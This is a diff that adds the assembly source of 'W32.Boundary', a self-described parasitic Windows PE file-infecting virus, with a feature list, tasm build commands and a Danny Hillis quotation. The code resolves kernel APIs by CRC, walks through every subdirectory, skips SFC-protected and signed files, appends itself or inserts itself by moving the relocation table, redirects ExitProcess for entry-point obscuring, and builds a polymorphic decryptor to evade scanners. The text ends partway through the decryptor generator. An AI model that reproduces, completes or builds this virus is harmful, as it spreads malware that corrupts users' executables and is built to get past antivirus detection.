@@ -1,0 +1,1670 @@
+comment ;)
+W32.Boundary by roy g biv
+
+some of its features:
+- parasitic direct action infector of PE exe (but not looking at suffix)
+- infects files in current directory and all subdirectories
+- directory traversal is linked-list instead of recursive to reduce stack size
+- reloc section inserter/last section appender
+- new kind of EPO using bound import table:
+- auto function type selection (Unicode under NT/2000/XP, ANSI under 9x/Me)
+- uses CRCs instead of API names
+- uses SEH for common code exit
+- no infect files with data outside of image (eg self-extractors)
+- no infect files protected by SFC/SFP (including under Windows XP)
+- uses SEH walker to find kernel address (no hard-coded addresses)
+- correct file checksum without using imagehlp.dll :) 100% correct algorithm
+---
+
+  optimisation tip: Windows appends ".dll" automatically, so this works:
+        push "cfs"
+        push esp
+        call LoadLibraryA
+---
+
+to build this thing:
+tasm
+----
+tasm32 /ml /m3 boundary
+tlink32 /B:400000 /x boundary,,,import32
+
+Virus is not self-modifying, so no need to alter section attributes
+---
+
+We're in the middle of a phase transition:
+a butterfly flapping its wings at
+just the right moment could
+cause a storm to happen.
+-I'm trying to understand-
+I'm at a moment in my life-
+I don't know where to flap my wings.
+(Danny Hillis)
+
+(;
+
+.386
+.model  flat
+
+extern  MessageBoxA:proc
+extern  ExitProcess:proc
+
+.data
+include boundary.inc
+
+dropper         label   near
+        mov     edx, krncrc_count
+        mov     ebx, offset krnnames
+        mov     edi, offset krncrcbegin
+        call    create_crcs
+        mov     edx, 1
+        mov     ebx, offset sfcnames
+        mov     edi, offset sfccrcbegin
+        call    create_crcs
+        push    CODESIZE
+        mov     ebx, esp
+        fld1
+        fild    dword ptr [ebx]
+        fyl2x
+        fistp   dword ptr [ebx]
+        pop     ecx
+        inc     ecx
+        push    1
+        pop     eax
+        shl     eax, cl
+        sub     eax, 4
+        mov     dword ptr [offset codesize_patch + 1], eax
+;-----------------------------------------------------------------------------
+;everything before this point is dropper code
+;-----------------------------------------------------------------------------
+align   4
+boundary_inf    label   near
+align
+        push    offset do_message                ;replaced by ExitProcess
+        xor     esi, esi
+        lods    dword ptr fs:[esi]
+        push    eax
+        mov     dword ptr fs:[esi - 4], esp
+        inc     eax
+
+walk_seh        label   near
+        dec     eax
+        xchg    esi, eax
+        lods    dword ptr [esi]
+        inc     eax
+        jne     walk_seh
+        enter   ((size findlist - 5) and -4) + ((statelen + 1) shl 2), 0
+                                                ;Windows NT/2000/XP enables alignment check exception
+                                                ;so some APIs fail if buffer is not dword aligned
+                                                ;-5 to align at 2 dwords earlier
+                                                ;because EBP saved automatically
+                                                ;and other register saved next
+                                                ;statelen for RNG cache
+        push    eax                             ;zero findprev in findlist
+        lods    dword ptr [esi]
+        call    init_findmz
+
+;-----------------------------------------------------------------------------
+;API CRC table, null terminated
+;-----------------------------------------------------------------------------
+
+krncrcbegin     label   near                    ;place < 80h bytes from call for smaller code
+        dd      (krncrc_count + 1) dup (0)
+krncrcend       label   near
+        dd      offset check_sfc - offset krncrcend + 4
+        db      "Boundary - roy g biv"          ;at the edge of reality
+
+init_findmz     label   near
+        inc     eax
+        xchg    edi, eax
+
+find_mzhdr      label   near
+
+;-----------------------------------------------------------------------------
+;do not use hard-coded kernel address values because it is not portable
+;Microsoft used all different values for 95, 98, NT, 2000, Me, XP
+;they will maybe change again for every new release
+;-----------------------------------------------------------------------------
+
+        dec     edi                             ;sub 64kb
+        xor     di, di                          ;64kb align
+        call    is_pehdr
+        jne     find_mzhdr
+        mov     ebx, edi
+        pop     edi
+
+;-----------------------------------------------------------------------------
+;parse export table
+;-----------------------------------------------------------------------------
+
+        mov     esi, dword ptr [esi + pehdr.peexport.dirrva - pehdr.pecoff]
+        lea     esi, dword ptr [ebx + esi + peexp.expadrrva]
+        lods    dword ptr [esi]                 ;Export Address Table RVA
+        lea     edx, dword ptr [ebx + eax]
+        lods    dword ptr [esi]                 ;Name Pointer Table RVA
+        lea     ecx, dword ptr [ebx + eax]
+        lods    dword ptr [esi]                 ;Ordinal Table RVA
+        lea     ebp, dword ptr [ebx + eax]
+        mov     esi, ecx
+
+push_export     label   near
+        push    ecx
+
+get_export      label   near
+        lods    dword ptr [esi]
+        push    ebx
+        add     ebx, eax                        ;Name Pointer VA
+        or      eax, -1
+
+crc_outer       label   near
+        xor     al, byte ptr [ebx]
+        push    8
+        pop     ecx
+
+crc_inner       label   near
+        add     eax, eax
+        jnb     crc_skip
+        xor     eax, 4c11db7h                   ;use generator polymonial (see IEEE 802)
+
+crc_skip        label   near
+        loop    crc_inner
+        sub     cl, byte ptr [ebx]              ;carry set if not zero
+        inc     ebx                             ;carry not altered by inc
+        jb      crc_outer
+        pop     ebx
+        cmp     dword ptr [edi], eax
+        jne     get_export
+
+;-----------------------------------------------------------------------------
+;exports must be sorted alphabetically, otherwise GetProcAddress() would fail
+;this allows to push addresses onto the stack, and the order is known
+;-----------------------------------------------------------------------------
+
+        pop     ecx
+        mov     eax, esi
+        sub     eax, ecx                        ;Name Pointer Table VA
+        shr     eax, 1
+        movzx   eax, word ptr [ebp + eax - 2]   ;get export ordinal
+        mov     eax, dword ptr [eax * 4 + edx]  ;get export RVA
+        add     eax, ebx
+        push    eax
+        scas    dword ptr [edi]
+        cmp     dword ptr [edi], 0
+        jne     push_export
+        add     edi, dword ptr [edi + 4]
+        jmp     edi
+
+;-----------------------------------------------------------------------------
+;get SFC support if available
+;-----------------------------------------------------------------------------
+
+check_sfc       label   near
+        call    load_sfc
+        db      "sfc_os", 0                     ;Windows XP (forwarder chain from sfc.dll)
+
+load_sfc        label   near
+        call    dword ptr [esp + krncrcstk.kLoadLibraryA]
+        test    eax, eax
+        jne     found_sfc
+        push    'cfs'                           ;Windows Me/2000
+        push    esp
+        call    dword ptr [esp + 4 + krncrcstk.kLoadLibraryA]
+        pop     ecx
+        test    eax, eax
+        je      sfcapi_push
+
+found_sfc       label   near
+        call    init_findmz
+
+;-----------------------------------------------------------------------------
+;API CRC table, null terminated
+;-----------------------------------------------------------------------------
+
+sfccrcbegin     label   near                    ;place < 80h bytes from call for smaller code
+        dd      0, 0
+sfccrcend       label   near
+        dd      offset swap_create - offset sfccrcend + 4
+
+sfcapi_push     label   near
+        push    eax
+
+swap_create     label   near
+
+;-----------------------------------------------------------------------------
+;swap CreateFileW and CreateFileMappingA because of alphabet order
+;-----------------------------------------------------------------------------
+
+        mov     ebx, esp
+        mov     eax, dword ptr [ebx + krncrcstk.kExitProcess]
+        mov     dword ptr [edi + offset offset boundary_inf  - swap_create + 1], eax
+        lea     esi, dword ptr [ebx + krncrcstk.kCreateFileMappingA]
+        mov     edi, esi
+        lods    dword ptr [esi]
+        movs    dword ptr [edi], dword ptr [esi]
+        stos    dword ptr [edi]
+
+;-----------------------------------------------------------------------------
+;determine platform and dynamically select function types (ANSI or Unicode)
+;so for Windows NT/2000/XP this code handles files that no ANSI function can open
+;-----------------------------------------------------------------------------
+
+        call    dword ptr [ebx + krncrcstk.kGetVersion]
+        shr     eax, 1fh                        ;treat 9x and Win32s as ANSI
+                                                ;safer than using AreFileApisANSI()
+        lea     ebp, dword ptr [eax * 4 + ebx]
+        lea     esi, dword ptr [ebx + size krncrcstk]
+        call    dword ptr [ebx + krncrcstk.kGetTickCount]
+        lea     edi, dword ptr [esi + ((size findlist + 3) and -4)]
+        call    randinit
+
+;-----------------------------------------------------------------------------
+;non-recursive directory traverser
+;-----------------------------------------------------------------------------
+
+scan_dir        proc    near                    ;ebp -> platform APIs, esi -> findlist
+        push    '*'                             ;ANSI-compatible Unicode findmask
+        mov     eax, esp
+        lea     ebx, dword ptr [esi + findlist.finddata]
+        push    ebx
+        push    eax
+        call    dword ptr [ebp + krncrcstk.kFindFirstFileW]
+        pop     ecx
+        mov     dword ptr [esi + findlist.findhand], eax
+        inc     eax
+        je      find_prev
+
+        ;you must always step forward from where you stand
+
+test_dirfile    label   near
+        mov     eax, dword ptr [ebx + WIN32_FIND_DATA.dwFileAttributes]
+        lea     edi, dword ptr [esi + findlist.finddata.cFileName]
+        test    al, FILE_ATTRIBUTE_DIRECTORY
+        je      test_file
+        cmp     byte ptr [edi], '.'             ;ignore . and .. (but also .* directories under NT/2000/XP)
+        je      find_next
+
+;-----------------------------------------------------------------------------
+;enter subdirectory, and allocate another list node
+;-----------------------------------------------------------------------------
+
+        push    edi
+        call    dword ptr [ebp + krncrcstk.kSetCurrentDirectoryW]
+        xchg    ecx, eax
+        jecxz   find_next
+        push    size findlist
+        push    GMEM_FIXED
+        call    dword ptr [esp + krncrcstk.kGlobalAlloc + 8]
+        xchg    ecx, eax
+        jecxz   step_updir
+        xchg    esi, ecx
+        mov     dword ptr [esi + findlist.findprev], ecx
+        jmp     scan_dir
+
+find_next       label   near
+        lea     ebx, dword ptr [esi + findlist.finddata]
+        push    ebx
+        mov     edi, dword ptr [esi + findlist.findhand]
+        push    edi
+        call    dword ptr [ebp + krncrcstk.kFindNextFileW]
+        test    eax, eax
+        jne     test_dirfile
+
+;-----------------------------------------------------------------------------
+;close find, and free list node if not list head
+;-----------------------------------------------------------------------------
+
+        mov     ebx, esp
+        push    edi
+        call    dword ptr [ebx + krncrcstk.kFindClose]
+
+find_prev       label   near
+        mov     ecx, dword ptr [esi + findlist.findprev]
+        jecxz   boundary_exit
+        push    esi
+        mov     esi, ecx
+        call    dword ptr [ebx + krncrcstk.kGlobalFree]
+
+step_updir      label   near
+
+;-----------------------------------------------------------------------------
+;the ANSI string ".." can be used, even on Unicode platforms
+;-----------------------------------------------------------------------------
+
+        push    '..'
+        org     $ - 1                           ;select top 8 bits of push
+boundary_exit   label   near
+        int     3                               ;game over
+
+        push    esp
+        call    dword ptr [ebx + krncrcstk.kSetCurrentDirectoryA]
+        pop     eax
+        jmp     find_next
+
+test_file       label   near
+
+;-----------------------------------------------------------------------------
+;get full path and convert to Unicode if required (SFC requires Unicode path)
+;-----------------------------------------------------------------------------
+
+        push    eax                             ;save original file attributes for close
+        mov     eax, ebp
+        enter   MAX_PATH * 2, 0
+        mov     ecx, esp
+        push    eax
+        push    esp
+        push    ecx
+        push    MAX_PATH
+        push    edi
+        call    dword ptr [eax + krncrcstk.kGetFullPathNameW]
+        xchg    edi, eax
+        pop     eax
+        xor     ebx, ebx
+        call    dword ptr [ebp + 8 + krncrcstk.kGetVersion]
+        test    eax, eax
+        jns     call_sfcapi
+        mov     ecx, esp
+        xchg    ebp, eax
+        enter   MAX_PATH * 2, 0
+        xchg    ebp, eax
+        mov     eax, esp
+        push    MAX_PATH
+        push    eax
+        inc     edi
+        push    edi
+        push    ecx
+        push    ebx                             ;use default translation
+        push    ebx                             ;CP_ANSI
+        call    dword ptr [ebp + 8 + krncrcstk.kMultiByteToWideChar]
+
+call_sfcapi     label   near
+
+;-----------------------------------------------------------------------------
+;don't touch protected files
+;-----------------------------------------------------------------------------
+
+        mov     ecx, dword ptr [ebp + 8 + krncrcstk.kSfcIsFileProtected]
+        xor     eax, eax                        ;fake success in case of no SFC
+        jecxz   leave_sfc
+        push    esp
+        push    ebx
+        call    ecx
+
+leave_sfc       label   near
+        leave
+        test    eax, eax
+        jne     restore_attr
+        call    set_fileattr
+        push    ebx
+        push    ebx
+        push    OPEN_EXISTING
+        push    ebx
+        push    ebx
+        push    GENERIC_READ or GENERIC_WRITE
+        push    edi
+        call    dword ptr [ebp + krncrcstk.kCreateFileW]
+        xchg    ebx, eax
+        call    test_infect
+        db      81h                             ;mask CALL
+        call    infect_file                     ;Super Nashwan power ;)
+        lea     eax, dword ptr [esi + findlist.finddata.ftLastWriteTime]
+        push    eax
+        sub     eax, 8
+        push    eax
+        push    0
+        push    ebx
+        call    dword ptr [esp + 4 + krncrcstk.kSetFileTime + 10h]
+        push    ebx
+        call    dword ptr [esp + 4 + krncrcstk.kCloseHandle + 4]
+
+restore_attr    label   near
+        pop     ebx                             ;restore original file attributes
+        call    set_fileattr
+        jmp     find_next
+scan_dir        endp
+
+;-----------------------------------------------------------------------------
+;look for MZ and PE file signatures
+;-----------------------------------------------------------------------------
+
+is_pehdr        proc    near                    ;edi -> map view
+        cmp     word ptr [edi], 'ZM'            ;Windows does not check 'MZ'
+        jne     pehdr_ret
+        mov     esi, dword ptr [edi + mzhdr.mzlfanew]
+        add     esi, edi
+        lods    dword ptr [esi]                 ;SEH protects against bad lfanew value
+        add     eax, -'EP'                      ;anti-heuristic test filetype ;) and clear EAX
+
+pehdr_ret       label   near
+        ret                                     ;if PE file, then eax = 0, esi -> COFF header, Z flag set
+is_pehdr        endp
+
+;-----------------------------------------------------------------------------
+;reset/set read-only file attribute
+;-----------------------------------------------------------------------------
+
+set_fileattr    proc    near                    ;ebx = file attributes, esi -> findlist, ebp -> platform APIs
+        push    ebx
+        lea     edi, dword ptr [esi + findlist.finddata.cFileName]
+        push    edi
+        call    dword ptr [ebp + krncrcstk.kSetFileAttributesW]
+        ret                                     ;edi -> filename
+        db      "22/06/06"
+set_fileattr    endp
+
+;-----------------------------------------------------------------------------
+;test if file is infectable (not protected, PE, x86, non-system, not infected, etc)
+;-----------------------------------------------------------------------------
+
+test_infect     proc    near                    ;ebx = file handle, esi = findlist, ebp -> platform APIs
+        call    map_view
+        mov     ebp, esi
+        call    is_pehdr
+        jne     inftest_ret
+        lods    dword ptr [esi]
+        cmp     ax, IMAGE_FILE_MACHINE_I386
+        jne     inftest_ret                     ;only Intel 386+
+        shr     eax, 0dh                        ;move high 16 bits into low 16 bits and multiply by 8
+        lea     edx, dword ptr [eax * 4 + eax]  ;complete multiply by 28h (size pesect)
+        mov     eax, dword ptr [esi + pehdr.pecoff.peflags - pehdr.pecoff.petimedate]
+
+;-----------------------------------------------------------------------------
+;IMAGE_FILE_BYTES_REVERSED_* bits are rarely set correctly, so do not test them
+;no .dll files this time
+;-----------------------------------------------------------------------------
+
+        test    ah, (IMAGE_FILE_SYSTEM or IMAGE_FILE_DLL or IMAGE_FILE_UP_SYSTEM_ONLY) shr 8
+        jne     inftest_ret
+
+;-----------------------------------------------------------------------------
+;32-bit executable file...
+;-----------------------------------------------------------------------------
+
+        and     ax, IMAGE_FILE_EXECUTABLE_IMAGE or IMAGE_FILE_32BIT_MACHINE
+        cmp     ax, IMAGE_FILE_EXECUTABLE_IMAGE or IMAGE_FILE_32BIT_MACHINE
+        jne     inftest_ret                     ;cannot use xor+jpo because 0 is also jpe
+
+;-----------------------------------------------------------------------------
+;the COFF magic value is not checked because Windows ignores it anyway
+;IMAGE_FILE_MACHINE_IA64 machine type is the only reliable way to detect PE32+
+;-----------------------------------------------------------------------------
+
+        add     esi, pehdr.pesubsys - pehdr.pecoff.petimedate
+        lods    dword ptr [esi]
+        cmp     ax, IMAGE_SUBSYSTEM_WINDOWS_CUI
+        jnbe    inftest_ret
+        cmp     al, IMAGE_SUBSYSTEM_WINDOWS_GUI ;al not ax, because ah is known now to be 0
+        jb      inftest_ret
+        shr     eax, 1eh                        ;test eax, IMAGE_DLLCHARACTERISTICS_WDM_DRIVER shl 10h
+        jb      inftest_ret
+
+;-----------------------------------------------------------------------------
+;avoid files which seem to contain attribute certificates
+;because one of those certificates might be a digital signature
+;-----------------------------------------------------------------------------
+
+        cmp     dword ptr [esi + pehdr.pesecurity.dirrva - pehdr.pestackmax], eax
+        jnbe    inftest_ret
+
+;-----------------------------------------------------------------------------
+;cannot use the NumberOfRvaAndSizes field to calculate the Optional Header size
+;the Optional Header can be larger than the offset of the last directory
+;remember: even if you have not seen it does not mean that it does not happen :)
+;-----------------------------------------------------------------------------
+
+        movzx   eax, word ptr [esi + pehdr.pecoff.peopthdrsize - pehdr.pestackmax]
+        add     eax, edx
+        push    esi
+        lea     esi, dword ptr [esi + eax - pehdr.pestackmax + pehdr.pemagic - size pesect + pesect.sectrawsize]
+        lods    dword ptr [esi]
+        add     eax, dword ptr [esi]
+        cmp     dword ptr [ebp + findlist.finddata.dwFileSizeLow], eax
+        xchg    esi, eax
+        pop     esi
+        jne     inftest_ret                     ;file contains appended data
+        mov     ebx, dword ptr [esi + pehdr.pefilealign - pehdr.pestackmax]
+        lea     ecx, dword ptr [ebx + ADDSIZE - 1]
+        neg     ebx
+        and     ecx, ebx
+        add     dword ptr [ebp + findlist.finddata.dwFileSizeLow], ecx
+        mov     edx, dword ptr [esp + mapsehstk.mapsehregs + 0ch]
+                                                ;retrieve -> platform APIs
+        mov     edx, dword ptr [edx + krncrcstk.kExitProcess + 0ch]
+        call    gather_info
+        adc     dword ptr [esp + mapsehstk.mapsehinfret], 0
+                                                ;skip call mask if found
+
+inftest_ret     label   near
+        int     3
+
+gather_info     proc    near
+        mov     ecx, dword ptr [esi + pehdr.pebound.dirrva - pehdr.pestackmax]
+        jecxz   gather_ret
+        push    edx
+        xchg    esi, eax
+        xchg    ebp, eax
+        add     ecx, edi                        ;it's really a RVA but it always exists before first section
+        mov     edx, ecx
+
+parse_bound     label   near
+        movzx   eax, word ptr [edx + pebind.bindrva]
+        test    eax, eax
+        je      gather_pop
+        add     edx, size pebind
+        mov     eax, dword ptr [ecx + eax]
+        or      eax, "    "
+        cmp     eax, "nrek"
+        jne     parse_bound
+        mov     ecx, dword ptr [ebp + pehdr.peimport.dirrva - pehdr.pestackmax]
+        call    rva2raw
+
+parse_import    label   near
+        push    ecx
+        mov     ecx, dword ptr [edi + ecx + peimp.impdllrva]
+        call    rva2raw
+        mov     eax, dword ptr [edi + ecx]
+        pop     ecx
+        add     ecx, size peimp
+        or      eax, "    "
+        cmp     eax, "nrek"
+        jne     parse_import
+        mov     ecx, dword ptr [edi + ecx - size peimp + peimp.impiatrva]
+        call    rva2raw
+        xor     eax, eax
+        add     edi, ecx
+        or      ecx, -1
+        push    edi
+        repne   scas dword ptr [edi]
+        pop     edi
+        pop     eax
+        not     ecx
+        repne   scas dword ptr [edi]
+        jne     gather_ret
+        stc
+        ret
+
+gather_pop      label   near
+        pop     eax
+
+gather_ret      label   near
+        ret
+gather_info     endp
+
+;-----------------------------------------------------------------------------
+;create file map, and map view if successful
+;-----------------------------------------------------------------------------
+
+map_view        proc    near                    ;ebx = file handle, esi -> findlist, ebp -> platform APIs
+        mov     eax, dword ptr [esi + findlist.finddata.dwFileSizeLow]
+        cdq
+        push    eax
+        mov     ecx, esp
+        push    eax                             ;MapViewOfFile
+        push    edx                             ;MapViewOfFile
+        push    edx                             ;MapViewOfFile
+        push    FILE_MAP_WRITE                  ;Windows 9x/Me does not support FILE_MAP_ALL_ACCESS
+        push    edx
+        push    eax
+        push    edx
+        push    PAGE_READWRITE
+        push    edx
+        push    ebx
+        call    dword ptr [ecx + size mapstack + krncrcstk.kCreateFileMappingA]
+                                                ;ANSI map is allowed because of no name
+        push    eax
+        xchg    edi, eax
+        call    dword ptr [esp + size mapstack + krncrcstk.kMapViewOfFile + 14h]
+        pop     ecx
+        xchg    edi, eax                        ;should succeed even if file cannot be opened
+        pushad
+        call    unmap_seh
+        pop     eax
+        pop     eax
+        pop     esp
+        xor     eax, eax
+        pop     dword ptr fs:[eax]
+        pop     eax
+        popad                                   ;SEH destroys all registers
+        push    eax
+        push    edi
+        call    dword ptr [esp + size mapstack + krncrcstk.kUnmapViewOfFile + 4]
+        call    dword ptr [esp + size mapstack + krncrcstk.kCloseHandle]
+        pop     eax
+        ret
+
+unmap_seh       proc    near
+        cdq
+        push    dword ptr fs:[edx]
+        mov     dword ptr fs:[edx], esp
+        jmp     dword ptr [esp + mapsehstk.mapsehsehret]
+unmap_seh       endp
+map_view        endp                            ;eax = map handle, ecx = new file size, edi = map view
+
+;-----------------------------------------------------------------------------
+;infect file
+;algorithm:     increase file size by large amount to confuse scanners that
+;               look at end of file
+;               if reloc table is not in last section (taken from relocation
+;               field in PE header, not section name), then append to last
+;               section.  otherwise, move relocs down and insert code into
+;               space (to confuse people looking at end of file.  they will
+;               see only relocation data and garbage or many zeroes)
+;               ExitProcess address is altered in import table.  very simple
+;-----------------------------------------------------------------------------
+
+infect_file     label   near                    ;esi -> findlist, edi = map view
+        call    map_view
+
+delta_label     label   near
+        push    ecx
+        push    edi
+        mov     ebx, dword ptr [edi + mzhdr.mzlfanew]
+        lea     ebx, dword ptr [ebx + edi + pehdr.pechksum]
+        xor     ecx, ecx
+        imul    cx, word ptr [ebx + pehdr.pecoff.pesectcount - pehdr.pechksum], size pesect
+        add     cx, word ptr [ebx + pehdr.pecoff.peopthdrsize - pehdr.pechksum]
+        lea     esi, dword ptr [ebx + ecx + pehdr.pemagic - pehdr.pechksum - size pesect + pesect.sectrawsize]
+        lods    dword ptr [esi]
+        mov     ecx, ADDSIZE
+        mov     edx, dword ptr [ebx + pehdr.pefilealign - pehdr.pechksum]
+        push    eax
+        add     eax, ecx
+        dec     edx
+        add     eax, edx
+        not     edx
+        and     eax, edx                        ;file align last section
+        mov     dword ptr [esi + pesect.sectrawsize - pesect.sectrawaddr], eax
+
+;-----------------------------------------------------------------------------
+;raw size is file aligned.  virtual size is not required to be section aligned
+;so if old virtual size is larger than new raw size, then size of image does
+;not need to be updated, else virtual size must be large enough to cover the
+;new code, and size of image is section aligned
+;-----------------------------------------------------------------------------
+
+        mov     ebp, dword ptr [esi + pesect.sectvirtaddr - pesect.sectrawaddr]
+        cmp     dword ptr [esi + pesect.sectvirtsize - pesect.sectrawaddr], eax
+        jnb     test_reloff
+        mov     dword ptr [esi + pesect.sectvirtsize - pesect.sectrawaddr], eax
+        add     eax, ebp
+        mov     edx, dword ptr [ebx + pehdr.pesectalign - pehdr.pechksum]
+        dec     edx
+        add     eax, edx
+        not     edx
+        and     eax, edx
+        mov     dword ptr [ebx + pehdr.peimagesize - pehdr.pechksum], eax
+
+;-----------------------------------------------------------------------------
+;if relocation table is not in last section, then append to last section
+;otherwise, move relocations down and insert code into space
+;-----------------------------------------------------------------------------
+
+test_reloff     label   near
+        test    byte ptr [ebx + pehdr.pecoff.peflags - pehdr.pechksum], IMAGE_FILE_RELOCS_STRIPPED
+        jne     copy_code
+        cmp     dword ptr [ebx + pehdr.pereloc.dirrva - pehdr.pechksum], ebp
+        jb      copy_code
+        mov     eax, dword ptr [esi + pesect.sectvirtsize - pesect.sectrawaddr]
+        add     eax, ebp
+        cmp     dword ptr [ebx + pehdr.pereloc.dirrva - pehdr.pechksum], eax
+        jnb     copy_code
+        add     dword ptr [ebx + pehdr.pereloc.dirrva - pehdr.pechksum], ecx
+        pop     eax
+        push    esi
+        add     edi, dword ptr [esi]
+        lea     esi, dword ptr [edi + eax - 1]
+        lea     edi, dword ptr [esi + ecx]
+        xchg    ecx, eax
+        std
+        rep     movs byte ptr [edi], byte ptr [esi]
+        cld
+        pop     esi
+        pop     edi
+        push    edi
+        push    ecx
+        xchg    ecx, eax
+
+copy_code       label   near
+        pop     edx
+        add     ebp, edx
+        xchg    ebp, eax
+        add     edx, dword ptr [esi]
+        add     edi, edx
+        add     eax, dword ptr [ebx + pehdr.peimagebase - pehdr.pechksum]
+        mov     edx, dword ptr [esp + infectstk.infseh.mapsehinfret - 8]
+        mov     dword ptr [edx + offset hostva - offset delta_label], eax
+        mov     ebp, dword ptr [esp + infectstk.infseh.mapsehregs + 8]
+                                                ;retrieve -> platform APIs
+        push    esi
+        push    esi
+        pushad
+        push    PAGE_READWRITE
+        push    MEM_COMMIT
+        push    ADDSIZE + ENTERSIZE
+        push    0
+        xchg    edx, eax
+        xchg    ebp, eax
+        call    dword ptr [eax + krncrcstk.kVirtualAlloc + 0ch]
+        lea     esi, dword ptr [eax - esp_delta]
+        lea     edi, dword ptr [esi + ENTERSIZE]
+        mov     dword ptr [esp + 4], edi
+        dec     byte ptr [esi + locked]
+        add     ebp, offset random - offset delta_label
+        call    ebp
+        and     eax, 7ffh
+        add     eax, 1000
+        xor     ecx, ecx
+
+loop_poly1      label   near
+        call    poly
+        dec     eax
+        jne     loop_poly1
+        mov     dword ptr [esp + 24h], edi
+
+decrypt_loop    label   near
+        pushad
+        call    decrypt_seh
+        pop     eax
+        pop     eax
+        pop     esp
+        xor     eax, eax
+        pop     dword ptr fs:[eax]
+        pop     eax
+        popad
+        jmp     decrypt_loop                    ;keep trying until success
+
+decrypt_seh     label   near
+        push    dword ptr fs:[eax]
+        mov     dword ptr fs:[eax], esp
+        call    make_decrypt
+        xor     byte ptr [esi + codebits + ((CODESIZE - 4) shr 5)], 1 shl (((CODESIZE shr 2) - 1) and 7)
+        inc     edx
+        call    decrypt_eip
+        mov     byte ptr [edi - 7], 0c3h
+        xor     eax, eax
+        pop     dword ptr fs:[eax]
+        pop     eax
+        popad
+        popad
+        push    eax
+        push    esi
+        rep     movs byte ptr [edi], byte ptr [esi]
+        push    MEM_RELEASE
+        push    ecx
+        sub     esi, ADDSIZE + ENTERSIZE - esp_delta
+        push    esi
+        call    dword ptr [ebp + krncrcstk.kVirtualFree + 0ch]
+        pop     esi
+        pop     ecx
+        pop     eax
+
+;-----------------------------------------------------------------------------
+;section attributes are always altered to executable because for Windows XP SP2
+;you can remove that bit, if you want, but we need the writable bit for decrypt
+;-----------------------------------------------------------------------------
+
+        or      byte ptr [eax + pesect.sectflags - pesect.sectrawaddr + 3], (IMAGE_SCN_MEM_EXECUTE or IMAGE_SCN_MEM_WRITE) shr 18h
+        mov     edx, dword ptr [ebp + krncrcstk.kExitProcess + 0ch]
+        pop     ebp
+        pop     edi
+        push    edi
+        sub     ebp, esi
+        add     ebp, ecx
+        push    ebp
+        lea     esi, dword ptr [ebx + pehdr.pestackmax - pehdr.pechksum]
+        call    gather_info
+        pop     dword ptr [edi - 4]
+
+;-----------------------------------------------------------------------------
+;optional: GetProcAddress for every import, and store all Bound TimeDateStamps
+;otherwise, there is chance that we will never execute
+;-----------------------------------------------------------------------------
+
+        pop     edi
+
+;-----------------------------------------------------------------------------
+;CheckSumMappedFile() - simply sum of all words in file, then adc filesize
+;-----------------------------------------------------------------------------
+
+        xor     ecx, ecx
+        xchg    dword ptr [ebx], ecx
+        jecxz   infect_ret
+        xor     eax, eax
+        pop     ecx
+        push    ecx
+        inc     ecx
+        shr     ecx, 1
+        clc
+
+calc_checksum   label   near
+        adc     ax, word ptr [edi]
+        inc     edi
+        inc     edi
+        loop    calc_checksum
+        pop     dword ptr [ebx]
+        adc     dword ptr [ebx], eax            ;avoid common bug.  ADC not ADD
+
+infect_ret      label   near
+        int     3                               ;common exit using SEH
+        db      "*4U2NV*"                       ;that is, unless you're reading this
+test_infect     endp
+
+make_decrypt    proc    near
+        push    edi
+        mov     cl, (unknown - esp_delta) shr 2
+        lea     edi, dword ptr [esi + esp_delta]
+        rep     stos dword ptr [edi]
+        dec     eax
+        mov     cl, 8
+        rep     stos dword ptr [edi]
+        inc     eax
+        mov     cl, (BITSIZE shr 2) + 1
+        add     edi, codebits - vals
+        rep     stos dword ptr [edi]
+        pop     edi
+        dec     byte ptr [esi + locked]
+        mov     byte ptr [esi + unknown + (REG_ESP * 4)], 0fch
+        mov     dword ptr [esi + vals + (REG_ESP * 4)], ecx
+        or      byte ptr [esi + codebits + ((CODESIZE - 4) shr 5)], 1 shl (((CODESIZE shr 2) - 1) and 7)
+        call    ebp
+        and     eax, 0ffh
+        add     eax, 800
+        xchg    ecx, eax
+
+inc_poly0       label   near
+        inc     ecx
+
+loop_poly0      label   near
+
+;-----------------------------------------------------------------------------
+;loop until count is zero, then continue until all registers initialised
+;count overloaded as non-random flag
+;-----------------------------------------------------------------------------
+
+        call    poly
+        loop    loop_poly0
+
+check_reg       label   near
+        mov     cl, 8
+        cdq
+
+or_unknown      label   near
+        cmp     cl, REG_ESP + 1
+        je      skip_unknown
+        or      edx, dword ptr [ecx * 4 + esi + unknown - 4]
+
+skip_unknown    label   near
+        loop    or_unknown
+        jne     inc_poly0
+        mov     edx, (CODESIZE shr 2) - 1
+
+decrypt_eip     label   near
+        push    edx
+
+decryptor       label   near
+        xor     ebx, ebx
+
+        ;if something to pop, and able to pop
+
+        call    ebp
+        test    al, 1
+        je      check_unmarked
+        cmp     dword ptr [esi + stacked], ebx
+        je      check_unmarked
+        cmp     dword ptr [esi + esp_delta], ebx
+        jne     check_unmarked
+        cmp     byte ptr [esi + donesub], bl
+        jne     check_unmarked
+        mov     ax, 848fh
+        stos    word ptr [edi]
+
+get_popreg      label   near
+
+;-----------------------------------------------------------------------------
+;randomly pick one or two registers other than ESP, with random scale
+;-----------------------------------------------------------------------------
+
+        call    ebp
+        mov     cl, al
+        and     eax, 7
+        cmp     al, REG_ESP
+        je      get_popreg
+        xchg    ecx, eax
+        stos    byte ptr [edi]
+        mov     ebx, dword ptr [ecx * 4 + esi + vals]
+        mov     cl, al
+        shr     al, 3
+        and     eax, 7
+        cmp     al, 4
+        je      skip_popscale
+        mov     eax, dword ptr [eax * 4 + esi + vals]
+        shr     cl, 6
+        shl     eax, cl
+        add     ebx, eax
+
+skip_popscale   label   near
+        dec     dword ptr [esi + stacked]
+        mov     eax, dword ptr [esi + stacked]
+        mov     eax, dword ptr [eax * 4 + esi + stack]
+        add     eax, dword ptr [ebp + offset hostva - offset random]
+        sub     eax, ebx
+        stos    dword ptr [edi]
+        add     dword ptr [esi + vals + (REG_ESP * 4)], 4
+        dec     dword ptr [esp]
+        jne     jmp_poly2
+        pop     edx
+
+decrypt_ret     label   near
+        ret
+
+check_unmarked  label   near
+
+;-----------------------------------------------------------------------------
+;if unmarked values left
+;-----------------------------------------------------------------------------
+
+        test    edx, edx
+        je      jmp_poly2
+        cmp     byte ptr [esi + donesub], bl
+        jne     check_locked
+        cmp     byte ptr [esi + prev_op], bl ;OP_ADD
+        jne     jmp_poly2
+        mov     dword ptr [esi + esp_delta], ebx
+        mov     eax, dword ptr [esi + stacked]
+        not     eax
+        shl     eax, 2
+        mov     bl, REG_ESP
+        call    adjust_val
+        inc     byte ptr [esi + donesub]
+        jmp     jmp_poly2
+
+check_locked    label   near
+
+        call    ebp
+        and     al, 1
+        jne     check_prevop
+
